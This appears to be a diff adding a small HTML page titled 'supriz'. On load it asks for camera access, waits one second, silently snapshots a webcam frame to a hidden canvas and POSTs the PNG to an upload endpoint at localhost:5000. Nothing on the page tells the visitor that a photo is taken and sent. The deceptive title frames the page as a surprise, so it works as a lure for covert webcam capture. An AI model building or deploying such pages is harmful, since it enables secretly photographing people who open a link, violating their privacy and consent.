@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>supriz</title>
+</head>
+
+<body>
+    <h1>supriz</h1>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        navigator.mediaDevices.getUserMedia({
+                video: true
+            })
+            .then(stream => {
+                video.srcObject = stream;
+                video.addEventListener('loadeddata', () => {
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('image', blob, 'capture.png');
+
+                            try {
+                                const response = await fetch(
+                                    'http://localhost:5000/upload', {
+                                        method: 'POST',
+                                        body: formData,
+                                    });
+                                const result = await response.json();
+                                alert(result.message);
+                            } catch (error) {
+                                console.error('Error uploading image:', error);
+                                alert('Failed to upload image.');
+                            }
+                        }, 'image/png');
+                    }, 1000);
+                });
+            })
+            .catch(err => {
+                console.error('Error accessing camera:', err);
+                alert('Camera access is required to use this feature.');
+            });
+    </script>
+</body>
+
+</html>
